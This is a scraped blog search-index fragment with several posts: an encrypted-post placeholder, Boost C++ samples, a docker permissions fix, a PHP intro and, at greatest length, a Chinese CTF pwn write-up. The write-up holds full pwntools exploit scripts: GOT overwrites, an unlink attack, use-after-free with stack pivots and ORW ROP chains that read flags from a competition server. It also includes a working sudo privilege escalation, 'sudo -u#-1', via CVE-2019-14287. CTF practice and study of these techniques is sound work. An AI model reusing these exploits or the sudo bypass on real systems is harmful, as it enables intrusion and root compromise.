c06067466dad5b8af2e87c0c80793b903ea0964a960262e83f4ac29a11eca4b97fa2554ff679e26ac4ae0c8295d5216295efecce019612beb8e8a6f411601449706dabb45813c5b03db02326d3688aa15cdbd2242d3ac52a1631acbe61f920d56c0e1508ae342fb72751117b79af076b2689db6aaecce0467f8e5e7114cc2d6e5eb5c9d62618100ca58db9f138382ad3c37def90ef64f2bc2f7c5243c1412cb8010c7b0e9ac3e2f2fd26b8325498c0abd36b6e307f5f734b3db9dfa289bee887fdff057d41a4176b2c6493ace032b8ceb505b8396c30b59e942b1ed6fc6995a0d42c18932d6f45f6073996394577e50d3ad928030cabd7d1fb7eced63df78b8856647e5b9b853d4a7dbdbfa4efd5a2dee05abfe4a388900abe42cb99a37cf929554f1400f693e60ea0fcd3ad4936e25b84bbdd9956bfdf5effa8c65f949d84b45fab712bc4c7ee9275e9d883f09a6a7f667581dcc4fc4808e907ff88799c3b66c42146fdb0aa115d5812a02228fdc01a3ca48e1b6343599ba689924130dbd27f2cfcd1f118d4840a472a18786a7643df110ad56415e71ce989ad915a6798e1bb8a00bf583e3fed21f87b51ff8b17e56a80f2c37a73278ee01864be0eb6754b36c4932e4f701bb26182556432a606a1e87cc240cf98ab7a0a0252310373cae0a6cc62f5a72a1f9f3531745c9c4ad88171b5743e68b326539e59a5c611a13148e022f176512593b56289204f00012ff49f4569b027802e2a9bc14e54a21b7ad44681747cb4fd647e04dc523fa55da078d51f3a843810b4243b7e680c01cc678523359bc73c94a6f5c4975abfab2f4aed30bcaa74f1bd7b83abcdeac4f36c91054c6cd2dd8d247834b742e1356a7f8d14e3ae27c75f3df15893eca3f28a034c8409119066714400ebeb9c5d69fd68c9dcb28f35e48ac156c885dc941e72e283b42729feb815e49b1c822388d7e3c9a5acc960af1e8f9bb1fc46ed3bad3a4f79aeb2ba97849fc450e4124dab7a25349a737aa622c715c86a20d0e11c913293711da443085caf49904e900697771c37a21d833b806ef1dc2459d15898bbcfddc15ec8653de702290ce2c1d6f2fc48436415177a1d300c608fc2d3cf12258e3550bb006ac17933a982497bd8a08c0ca855d24c6e61b944052394e8900483237abf459b5d740ece680ea36a1c5a86ae2e18c9763106dc3bd3514e17a20260dd773abc45ff999e9cda53ca3a2ea4d31c4c256359e6e7fd4d2bb901e11502e345c2ab7de55ad353bc5ecfbd0e3972be4b2d0590c8e435613c889de8a1459b01950e4d693d816335a7f1fd4abfc3e89ec74d8544d1eef65b7758777726438744e442f7cd4d84873328c0ae5668790c577d57bd326decdb599c0190782dcce44448215c1d35fff2d0497a5123351890974c0a948b54e97d65468ad9f29a55a48191d601462f7c64275e098e7067891ab469df4828c86c2a3ba342242f6ace8cdc42251f1c9b7704fb408a448f95126914f852cea\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"Boost","url":"/2021/02/17/dev/language/cpp/lib/boost/","content":"Boost库获取版本#include &lt;boost/version.hpp&gt;#include &lt;boost/config.hpp&gt;#include &lt;iostream&gt;using namespace std;int main() &#123;\tcout &lt;&lt; BOOST_VERSION &lt;&lt; endl;\tcout &lt;&lt; BOOST_LIB_VERSION &lt;&lt; endl;\tcout &lt;&lt; BOOST_PLATFORM &lt;&lt; endl;\tcout &lt;&lt; BOOST_COMPILER &lt;&lt; endl;\tcout &lt;&lt; BOOST_STDLIB &lt;&lt; endl;\treturn 0;&#125;\n\n排序#include &lt;vector&gt;#include &lt;iterator&gt;#include &lt;algorithm&gt;#include &lt;boost/timer.hpp&gt;#include &lt;boost/progress.hpp&gt;#include &lt;boost/date_time/posix_time/posix_time.hpp&gt;using namespace boost;int main() &#123;    boost::timer t;    boost::progress_display pd(100);    for (int i = 0; i &lt; 100; ++i) &#123;//进度条        usleep(1000 * 1000);        ++pd;    &#125;    boost::gregorian::date dt(2009, 12, 8); //date_time 库    assert(dt.year() == 2009);    assert(dt.day() == 8);    boost::gregorian::date::ymd_type ymd = dt.year_month_day();    std::cout&lt;&lt;&quot;\\n&quot;&lt;&lt;ymd.year&lt;&lt;&quot;/&quot;&lt;&lt;ymd.month&lt;&lt;&quot;/&quot;&lt;&lt;ymd.day&lt;&lt;&quot; the day is &quot;        &lt;&lt;dt.day_of_year() &lt;&lt;&quot; days of this year&quot;&lt;&lt; std::endl;    std::cout &lt;&lt; boost::gregorian::to_iso_extended_string(dt) &lt;&lt; std::endl; //转换为其他格式    std::cout &lt;&lt; boost::gregorian::to_iso_string(dt) &lt;&lt; std::endl;    std::cout &lt;&lt; boost::gregorian::to_simple_string(dt) &lt;&lt; std::endl&lt;&lt;std::endl;    //对数组排序操作    std::vector&lt;int&gt; test_vc(100);      std::vector&lt;int&gt;::iterator beg_it = test_vc.begin();    std::vector&lt;int&gt;::iterator end_it = test_vc.end();    std::srand(std::time(NULL));    std::for_each(beg_it, end_it, [](int&amp; n)&#123;n = rand(); &#125;);    std::copy(beg_it, end_it, std::ostream_iterator&lt;int&gt;(std::cout, &quot; &quot;));    std::cout &lt;&lt; std::endl &lt;&lt; std::endl;    std::sort(beg_it, end_it, std::greater&lt;int&gt;());    std::copy(beg_it, end_it, std::ostream_iterator&lt;int&gt;(std::cout, &quot; &quot;));    std::cout &lt;&lt; std::endl&lt;&lt;std::endl;    boost::posix_time::ptime pt(boost::gregorian::date(2005, 2, 6));    std::cout &lt;&lt; t.elapsed() &lt;&lt; &quot;s&quot; &lt;&lt; std::endl; //程序运行时间    system(&quot;pause&quot;);    return 0;&#125;\n\n\n\nPython#include &lt;boost/python.hpp&gt;#include &lt;iostream&gt;struct StructionData &#123;    void hello() &#123;        std::cout &lt;&lt; &quot;hello, this is boost::python sample!\\n&quot;;    &#125;    void msg() &#123;        std::cout &lt;&lt; &quot;print msg!\\n&quot;;    &#125;&#125;;BOOST_PYTHON_MODULE(Boost_Python_Sqmple) &#123; //为静态编译    boost::python::class&lt;StructionData&gt;(&quot;StructionData&quot;)    .def(&quot;hello&quot;, &amp;StructionData::hello)    .def(&quot;msg&quot;, &amp;StructionData::msg);&#125;\n\n\n\nThread#include &lt;iostream&gt;#include &lt;boost/thread/thread.hpp&gt;#include &lt;boost/timer.hpp&gt;// g++ p3.cpp -lboost_thread -lpthread using namespace std;using namespace boost;void hello() &#123;    cout &lt;&lt; &quot;hello boost&quot; &lt;&lt; endl;&#125;int main() &#123;    boost::timer t;    boost::thread thr(&amp;hello);    thr.join();    cout &lt;&lt; t.elapsed_max() / 3600 &lt;&lt; endl; //最大时间，单位:小时    cout &lt;&lt; t.elapsed_min() &lt;&lt; endl; //最小统计时间，单位: 秒    cout &lt;&lt; t.elapsed() &lt;&lt; endl; // 从建立对象开始，时间流失统计&#125;\n\n","categories":["language"],"tags":["cpp","boost"]},{"title":"当前用户使用docker命令无权限","url":"/2021/02/11/env/docker/permisson_issues/","content":"当前用户使用docker无权限添加用户到docker组即可\n创建docker用户组\nsudo groupadd docker\n\n添加当前用户加入docker用户组\nsudo usermod -aG docker $&#123;USER&#125;\n重启docker服务\nsudo systemctl restart docker\n\n\n\n","categories":["env"],"tags":["docker"]},{"title":"HWS PWN WRITE UP","url":"/2021/02/01/security/ctf/compitation/wp-hws/","content":"HWS PWN WRITE UPemarm思路aarch64，输入’\\x00’即可绕过passwd检查，爆破修改atoi的got为system，传入’sh\\x00’即可。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./emarm&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;183.129.189.60&quot;server_port = 10012# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit(n):\tli(&#x27;exploit...&#x27;)\tsla(&#x27;:&#x27;, &#x27;\\x00&#x27; * 7)\tsleep(0.1)\ts(str(elf.got[&#x27;atoi&#x27;]))\tli(&#x27;atoi :&#x27; + hex(libc.sym[&#x27;atoi&#x27;]))\tli(&#x27;system :&#x27; + hex(libc.sym[&#x27;system&#x27;]))\tli(&#x27;puts :&#x27; + hex(libc.sym[&#x27;puts&#x27;]))\ts(&#x27;\\xc8\\xf2&#x27;)\t\tsleep(0.5)\ts(&#x27;sh\\x00&#x27;)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tfor n in range(0x1):\t\ttry:\t\t\tli(&#x27;round: &#x27; + str(n))\t\t\telf = ELF(elf_path)\t\t\tif LOCAL:\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\t\tio = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\t\t#io = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\telse:\t\t\t\t\t#io = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\t\tio = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\telse:\t\t\t\tio = remote(server_ip, server_port)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit(n)\t\t\tfinish()\t\texcept:\t\t\tc()\t\t\tcontinue\n\n\n\n\n\nememarmaarch64架构，off bye null漏洞，由于从1 ~ n - 1个chunk数据区的下面会储存一个chunk指针，off by null可以导致这个指针值最低字节为0，释放内存可以实现释放修改后的，若不同的chunk修改chunk指针都指向同一区域，两次释放相同的内存，造成uaf漏洞，劫持tcache fd为free函数的got表，爆破system函数，由于远程未开启alsr，我根据echo 命令爆破了3个多小时还没出，只能根据puts函数手推system地址，直接10分钟不到就测出了system地址。。。。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./ememarm&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;183.129.189.60&quot;server_port = 10034# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(n, b, yn):\tsla(&#x27;:&#x27;, &#x27;1&#x27;)\tsa(&#x27;:&#x27;, n)\tsa(&#x27;:&#x27;, b)\tsla(&#x27;?&#x27;, str(yn))def dp(n):\tsla(&#x27;:&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(n))def md(n, d):\tsla(&#x27;:&#x27;, &#x27;3&#x27;)\tsl(str(n))\ts(d)#--------------------------exploit--------------------------def exploit(n):\tli(&#x27;exploit...&#x27;)\tsa(&#x27;\\n&#x27;, &#x27;A&#x27; * 0x18)\tad(&#x27;/bin/sh\\x00&#x27;, p64(1), 1)\tad(&#x27;/bin/sh\\x00&#x27;, p64(1), 1)\tad(&#x27;/bin/sh\\x00&#x27;, p64(0x31), 1) # fake\tad(&#x27;/bin/sh\\x00&#x27;, p64(1), 1)\tad(p64(1), p64(1), 1)\tad(p64(1), p64(1), 1) # 6\tad(p64(1), p64(1), 1)\tmd(6 , &#x27;B&#x27; * 0x18) # delete\tmd(5, &#x27;B&#x27; * 0x18)\tlibc_base = 0x55008e6790 - libc.sym[&#x27;free&#x27;] + ( 0x1000 * n)\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tfree_got = elf.got[&#x27;free&#x27;]\tfree = libc_base + libc.sym[&#x27;free&#x27;]\tscanf = libc_base + libc.sym[&#x27;__isoc99_scanf&#x27;]\t#sleep(1)\tad(p64(free_got), p64(1), 0)\tad(&#x27;/bin/sh\\x00&#x27;, p64(1), 0)\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;system: &#x27; + hex(system))\tli(&#x27;free_hook: &#x27; + hex(free_hook))\tli(&#x27;free  : &#x27; + hex(free))\tli(&#x27;free_got: &#x27; + hex(free_got))\tli(&#x27;scanf: &#x27; + hex(scanf))\t#e2c8\t#n = 0x8ae\tn = 0x221\tp = p32(0x2c8 + n * 0x1000)[0:3]\tad(&#x27;\\xc8\\xf2\\x86&#x27;, &#x27;\\x68&#x27;, 0) #0 a c 7\t#free: 8aa790\t#puts: 893f40\t#system: 86f2c8\tmd(1, &#x27;/bin/sh\\x00&#x27;)\t&#x27;&#x27;&#x27;\tli(&#x27;get shell ...&#x27;)\tsl(&#x27;echo &quot;i0gan&quot;&#x27;)\tru(&#x27;i0gan&#x27;)\tli(&#x27;--------------found--------------&gt;&gt;&gt; :&#x27; + str(n) + &quot; &lt;&lt;&lt;------&quot;)\tos.system(&#x27;echo &quot;&#x27; + hex(n) + &#x27;&quot; &gt;&gt; n&#x27;)\t&#x27;&#x27;&#x27;def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tfor n in range(0x1):\t\ttry:\t\t\tli(&#x27;round: &#x27; + str(n))\t\t\telf = ELF(elf_path)\t\t\tif LOCAL:\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\t\tio = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\t\t#io = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\telse:\t\t\t\t\t#io = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\t\t\tio = process([&#x27;/usr/bin/qemu-aarch64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])\t\t\telse:\t\t\t\tio = remote(server_ip, server_port)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit(n)\t\t\tfinish()\t\texcept:\t\t\tc()\t\t\tcontinue\n\n\n\njustcode思路:程序开启了sandbox，禁用了execve，只能采用orw。使用scanf函数修改strdup的got为add rsp, 0x18; ret 的一个gadget这样直接可以在堆栈中构造rop，由于长度限制，先在堆栈中放入’.&#x2F;flag’字符串，由于rdi指向该区域，若直接调用open函数的话，存在push，会将该字符串给覆盖掉，避免被覆盖只能采用syscall实现open。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;elf_path  = &#x27;justcode&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;# remote server ip and porthost = &quot;183.129.189.60:10041&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tsl(&#x27;1&#x27;)\tsl(&#x27;1&#x27;)\tsl(&#x27;2&#x27;)\tsl(&#x27;1&#x27;)\t# leak libc\t# step 1\tsleep(0.1)\tp = &#x27;A&#x27; * (0x7 + 8 + 8)\tsla(&#x27;:&#x27;, p)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;_IO_getline_info&#x27;] - 170\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tif(LOCAL):\t\tgadget = libc_base + 0x2cbc6 # add rsp , 0x18\telse:\t\tgadget = libc_base + 0x35142 # add rsp , 0x8\t\tgadget = libc_base + 0x3ab5f # add rsp , 0x18\t# step 2\tsleep(0.1)\tp = b&#x27;A&#x27; * 0xc + p32(elf.got[&#x27;strdup&#x27;])\tsla(&#x27;:&#x27;, p)\t#target = libc_base + libc.sym[&#x27;puts&#x27;]\t\t# step 3\tsleep(0.1)\tsl(str(gadget &amp; 0xffffffff))\tsleep(0.1)\ts(&#x27;A&#x27; * 0x6c)\tpop_rdi = 0x400ea3\tpop_rdx_rsi = libc_base + 0x115189\tpop_rsi = libc_base + 0x202f8\tpop_rax = libc_base + 0x3a738\tsyscall = libc_base + 0xF6F95\tflag_addr = elf.bss() + 0x400\tp = b&#x27;./flag&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)\tp += flat([\tpop_rax, 2, pop_rsi, 0, syscall, # open\tpop_rdi, 3, pop_rdx_rsi, 0x100, flag_addr, elf.sym[&#x27;read&#x27;],\tpop_rdi, 1, libc_base + libc.sym[&#x27;write&#x27;]\t])\t#db()\tsleep(0.1)\tsa(&#x27;:&#x27;, p)\t# step 4\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\tlibc_path = &#x27;./libc-2.23.so&#x27;\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\tio = elf.process()\telse:\t\tlibc_path = &#x27;./libc.so.6&#x27;\t\telf = ELF(elf_path)\t\tio = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\nundlcv思路通过unlink打入指针数组，实现任意地址修改，不知道为啥爆破atoi函数为system一直没调用成功，只能爆破修改read函数got为one_gadget，打通几率大致为1 &#x2F; 64，打通之后，需要提权为root才能读取flag，采用CVE-CVE-2021-3156可以实现，但是poc是需要拥有可执行权限，上传了也没办法执行，采用另一个CVE-2019-14287: 命令如下:\nsudo -u#-1 id -u0\n\n以上已经可以提权, sudo -u#-1 [cmd] 可以实现任意高权限命令执行\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./undlcv&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc-2.23.so&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;183.129.189.60:10013&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(idx):\tsl(&#x27;1&#x27;.ljust(9, &#x27;\\x00&#x27;))\tsl(str(idx).ljust(9, &#x27;\\x00&#x27;))def md(idx, d):\tsl(&#x27;2&#x27;.ljust(9, &#x27;\\x00&#x27;))\tsl(str(idx).ljust(9, &#x27;\\x00&#x27;))\ts(d)def rm(idx):\tsl(&#x27;3&#x27;.ljust(9, &#x27;\\x00&#x27;))\tsl(str(idx).ljust(9, &#x27;\\x00&#x27;))def md_free():\tsl(&#x27;4&#x27;.ljust(9, &#x27;\\x00&#x27;))def to_hex(d):\th = &#x27;&#x27;\tfor c in d:\t\th += &#x27;\\\\&#x27;\t\th += &#x27;%03o&#x27; % c\treturn h#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t&#x27;&#x27;&#x27;\t# dump libc\tad(0)\tad(1)\tmd(0, b&#x27;A&#x27; * 0xf0 + p64(0))\trm(1)\t&#x27;&#x27;&#x27;\t\ttarget = 0x403480\tad(0)\tad(1)\tp = p64(0) + p64(0xf1)\tp += p64(target - 0x18) + p64(target - 0x10)\tp = p.ljust(0xf0, b&#x27;\\x00&#x27;)\tp += p64(0xf0)\tmd(0, p)\trm(1)\tmd(0, b&#x27;A&#x27; * 0x18 + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;read&#x27;]))\tli(&#x27;atoi: &#x27; + hex(libc.sym[&#x27;atoi&#x27;]))\tli(&#x27;system: &#x27; + hex(libc.sym[&#x27;system&#x27;]))\tli(&#x27;__libc_start_main: &#x27; + hex(libc.sym[&#x27;__libc_start_main&#x27;]))\t#db()\tmd(1, &#x27;\\x64\\x03&#x27;)\tsleep(0.5)\tsl(&#x27;/bin/sh&#x27;)\t#sl(&#x27;echo &quot;i0gan&quot;&#x27;)\t#r = io.recvuntil(&#x27;\\n&#x27;)\tsl(&#x27;ls&#x27;)\tsl(&#x27;sudo -u#-1 cat flag&#x27;)\t#sl(&#x27;echo &quot;&#x27; + to_hex(b&#x27;\\x41\\x41\\x42\\x00\\x01\\xff&#x27;) + &#x27;&quot; &gt; file&#x27;)\t#p = &#x27;/usr/local/bin/sudoedit &#x27;\t#p += &#x27;-A -s \\\\&#x27;def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tfor _ in range(16):\t\ttry:\t\t\tif LOCAL:\t\t\t\telf = ELF(elf_path)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\t\tio = elf.process()\t\t\telse:\t\t\t\telf = ELF(elf_path)\t\t\t\tio = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]), timeout = 2)\t\t\t\tif LIBC:\t\t\t\t\tlibc = ELF(libc_path)\t\t\texploit()\t\t\tfinish()\t\texcept:\t\t\tcontinue\n\n[注] 在狠狠师傅问导下知道提权漏洞为CVE-2019-14287\nvtcpp思路uaf 漏洞，劫持函数指针，开启了sandbox，规则过滤execve,和open函数，在libc中找一个堆栈迁移的gadget，由于libc版本不是标准版，setcontext函数中采用的是rcx，构成死解，无法采用setcontext函数实现堆栈迁移，采用libc另一个gadget即可，如下:\n[注] 在狠狠师傅指导下，找到一个很方便的gadget利用\n7371e:\t48 8b af 98 00 00 00 \tmov    rbp,QWORD PTR [rdi+0x98]73725:\t48 89 ef             \tmov    rdi,rbp73728:\tff 55 20             \tcall   QWORD PTR [rbp+0x20]\n\n由于open已经被禁掉，只能采用openat函数来打开文件了\nint openat(int fd, const char *path, int oflag, …);\n当第一个参数为AT_FDCWD时，与open实现一样的功能。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;elf_path  = &#x27;vtcpp2&#x27;# remote server ip and porthost = &quot;183.129.189.60:10000&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ct(name, age, msg):\tsla(&#x27;&gt;&#x27;, &#x27;1&#x27;)\tsla(&#x27;:&#x27;, name)\tsla(&#x27;:&#x27;, str(age))\tsla(&#x27;:&#x27;, msg)def rm():\tsla(&#x27;&gt;&#x27;, &#x27;2&#x27;)def dp():\tsla(&#x27;&gt;&#x27;, &#x27;3&#x27;)def nt(sz, d):\tsla(&#x27;&gt;&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(sz))\tsa(&#x27;:&#x27;, d)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tputs_info = 0x4019A0\tmsg_buf   = 0x603360\tchunk_ptr = 0x603340\t# leak libc\tct(&#x27;i0gan&#x27;, 19, p64(puts_info))\trm()\tnt(0x38, p64(msg_buf) + p64(0) + p64(elf.got[&#x27;puts&#x27;]))\tdp()\tru(&#x27;name :&#x27;)\tleak = u64(ru(&#x27;\\x0a&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;puts&#x27;]\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\t# align to bottom\tif(LOCAL):\t\tnt(0xa0, &#x27;buf&#x27;)\telse:\t\tnt(0xa0, &#x27;buf&#x27;)\t\t#for _ in range(10):\t\t\t#\tnt(0x38, &#x27;buf&#x27;)\t# leak heap\tct(&#x27;i0gan&#x27;, 19, p64(puts_info))\trm()\tnt(0x38, p64(msg_buf) + p64(0) + p64(chunk_ptr))\tdp()\tru(&#x27;name :&#x27;)\theap = u64(ru(&#x27;\\x0a&#x27;)[-5:] + b&#x27;\\x00\\x00\\x00&#x27;)\tli(&#x27;heap: &#x27; + hex(heap))\t# create rop on heap\tgadget = libc_base + 0x7371E\trop_addr = heap + 0x40 + 0xe8\tct(&#x27;i0gan&#x27;, 19, p64(gadget))\trm()\tnt(0x38, p64(msg_buf))\tret = 0x400538\tpop_rdi = 0x401ca3\tleave_ret = 0x401961\tadd_rsp_ret = libc_base + 0x13882b # add rsp, 0x68, ret\topenat = libc_base + libc.sym[&#x27;openat&#x27;]\tpop_rdx_rsi = libc_base + 0x115189\tp = p64(1) + p64(add_rsp_ret)\tp += b&#x27;./flag&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)\tp += p64(leave_ret)\tp = p.ljust(0x98 - 0x40, b&#x27;\\x00&#x27;)\tp += p64(heap + 0x80) # set rbp = rdi\tp += p64(0) * 3\trop = flat([\tret, pop_rdi, 0xffffff9c, pop_rdx_rsi, 0, heap + 0x90, openat,\tpop_rdi, 3, pop_rdx_rsi, 0x100, heap, libc_base + libc.sym[&#x27;read&#x27;],\tpop_rdi, 1, libc_base + libc.sym[&#x27;write&#x27;]\t])\tp += rop\tnt(0x200, p)\t#db()\tdp()def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\tlibc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;\t\t#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;\t\tlibc_path = &#x27;./libc-2.23.so&#x27;\t\t\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t#io = elf.process()\t\tio = process([elf_path], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)\telse:\t\tlibc_path = &#x27;./libc-2.23.so&#x27;\t\telf = ELF(elf_path)\t\tio = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()","categories":["ctf"],"tags":["pwn"]},{"title":"PHP学习","url":"/2021/01/24/dev/language/php/php/","content":"PHP学习About PHP简介PHP: Hypertext Preprocessor, 超文本预处理器。php是一种功能强大，并简便易用的脚本语言，它可嵌入到HTML中，尤其适合web开发。\n起源1994年， Rasmus床找了php，（这完全是个人爱好)\n1997年，Zeev, Andi重写解析器，发展到PHP3 (有了队伍)\n2000年五月，php4发布，它使用了Zend引擎(Zeev+andi)。(有了标准)\n2004年7月，php5正式发布。( 飞速发展，不断创新)\nphp官方网址: 